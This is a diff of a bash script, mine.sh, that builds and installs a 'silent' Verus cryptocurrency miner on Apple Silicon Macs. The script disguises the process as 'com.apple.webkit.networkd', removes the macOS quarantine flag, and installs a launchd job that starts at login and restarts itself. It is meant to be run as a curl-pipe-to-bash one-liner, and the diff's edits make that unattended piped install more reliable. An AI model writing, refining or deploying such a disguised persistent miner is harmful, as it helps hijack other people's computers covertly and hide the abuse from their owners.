@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ============================================================
 # mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
-# Builds ccminer natively (M1/M2/M3/M4) via autotools
+# M1 / M2 / M3 / M4 — builds ccminer natively
 # Process appears as: "com.apple.webkit.networkd"
 # Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
 # ============================================================
@@ -37,17 +37,24 @@ sleep 1
 if [[ ! -f "$BINARY_PATH" ]]; then
   echo "[*] Building ccminer from source..."
 
-  # ensure Homebrew is available
+  # Ensure Homebrew is available — redirect stdin so brew never reads from pipe
   if ! command -v brew &>/dev/null; then
     echo "[*] Installing Homebrew..."
     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
   fi
-  eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null || /usr/local/bin/brew shellenv 2>/dev/null)"
+
+  # Source brew env
+  if [[ -f /opt/homebrew/bin/brew ]]; then
+    eval "$(/opt/homebrew/bin/brew shellenv)"
+  elif [[ -f /usr/local/bin/brew ]]; then
+    eval "$(/usr/local/bin/brew shellenv)"
+  fi
 
   echo "[*] Installing build tools..."
-  brew install automake autoconf openssl@3 curl 2>/dev/null
+  # </dev/null prevents brew from consuming piped stdin
+  brew install automake autoconf openssl@3 curl </dev/null 2>/dev/null
 
-  # Force OpenSSL 3 (not 4) — ccminer bignum.cpp is incompatible with OpenSSL 4 API
+  # Force OpenSSL 3 (openssl4 breaks bignum.cpp)
   OPENSSL_PREFIX="$(brew --prefix openssl@3)"
   export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
   export CPPFLAGS="-I${OPENSSL_PREFIX}/include"
@@ -55,22 +62,23 @@ if [[ ! -f "$BINARY_PATH" ]]; then
   export PATH="${OPENSSL_PREFIX}/bin:$PATH"
 
   rm -rf "$BUILD_DIR"
-  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR"
+  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR" </dev/null
   cd "$BUILD_DIR"
 
   echo "[*] Running autogen..."
-  ./autogen.sh 2>&1 | tail -5
+  ./autogen.sh </dev/null 2>&1 | tail -3
 
   echo "[*] Configuring..."
-  ./configure.sh 2>&1 | tail -10
+  ./configure.sh </dev/null 2>&1 | tail -5
 
-  # Strip ARM32-only flag that breaks Apple Silicon (arm64) clang
-  echo "[*] Patching Makefile for arm64..."
-  find . -name "Makefile" -exec sed -i '' 's/-mfpu=[^ ]*//g' {} \; 2>/dev/null
-  find . -name "*.mk"     -exec sed -i '' 's/-mfpu=[^ ]*//g' {} \; 2>/dev/null
+  # Patch out ARM32-only flags that break arm64 Apple clang
+  echo "[*] Patching for arm64..."
+  find . -name "Makefile" | xargs sed -i '' 's/-mfpu=[^ "]*//g' 2>/dev/null
+  find . -name "Makefile" | xargs sed -i '' 's/-march=armv7[^ "]*//g' 2>/dev/null
+  find . -name "Makefile" | xargs sed -i '' 's/-mfloat-abi=[^ "]*//g' 2>/dev/null
 
-  echo "[*] Compiling (this takes ~5 min)..."
-  make -j"$THREADS" 2>&1 | tail -5
+  echo "[*] Compiling (~5 min)..."
+  make -j"$THREADS" 2>&1 | grep -E "error:|warning:|ccminer$|^\[" | tail -20
 
   if [[ -f "$BUILD_DIR/ccminer" ]]; then
     cp "$BUILD_DIR/ccminer" "$BINARY_PATH"
@@ -78,39 +86,33 @@ if [[ ! -f "$BINARY_PATH" ]]; then
     xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
     echo "[+] Build successful."
   else
-    echo "[!] Build failed — check output above."
+    echo "[!] Build failed."
     exit 1
   fi
 else
   echo "[*] Binary already exists — skipping build."
 fi
 
-# ---- write launchd plist ----
-cat > "$PLIST_PATH" <<PLIST
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key>             <string>${DISGUISE_NAME}</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>${BINARY_PATH}</string>
-    <string>-a</string>    <string>verus</string>
-    <string>-o</string>    <string>stratum+tcp://${POOL_HOST}:${POOL_PORT}</string>
-    <string>-u</string>    <string>${WALLET}.${WORKER}</string>
-    <string>-p</string>    <string>x</string>
-    <string>-t</string>    <string>${THREADS}</string>
-  </array>
-  <key>RunAtLoad</key>         <true/>
-  <key>KeepAlive</key>         <true/>
-  <key>StandardOutPath</key>   <string>${LOG_PATH}</string>
-  <key>StandardErrorPath</key> <string>${LOG_PATH}</string>
-  <key>ProcessType</key>       <string>Background</string>
-  <key>Nice</key>              <integer>5</integer>
-</dict>
-</plist>
-PLIST
+# ---- write launchd plist using printf (safe with pipe) ----
+printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
+printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
+printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
+printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
+printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
+printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
+printf '    <string>-a</string><string>verus</string>\n' >> "$PLIST_PATH"
+printf '    <string>-o</string><string>stratum+tcp://%s:%s</string>\n' "$POOL_HOST" "$POOL_PORT" >> "$PLIST_PATH"
+printf '    <string>-u</string><string>%s.%s</string>\n' "$WALLET" "$WORKER" >> "$PLIST_PATH"
+printf '    <string>-p</string><string>x</string>\n' >> "$PLIST_PATH"
+printf '    <string>-t</string><string>%s</string>\n' "$THREADS" >> "$PLIST_PATH"
+printf '  </array>\n' >> "$PLIST_PATH"
+printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
+printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
+printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
+printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
+printf '  <key>ProcessType</key><string>Background</string>\n' >> "$PLIST_PATH"
+printf '  <key>Nice</key><integer>5</integer>\n' >> "$PLIST_PATH"
+printf '</dict></plist>\n' >> "$PLIST_PATH"
 
 # ---- launch ----
 launchctl load -w "$PLIST_PATH"
@@ -131,4 +133,4 @@ echo "  Status    : launchctl list | grep webkit.networkd"
 echo "  Stop      : launchctl unload \"$PLIST_PATH\""
 echo ""
 sleep 3
-tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly — check in 30 seconds."
+tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly..."
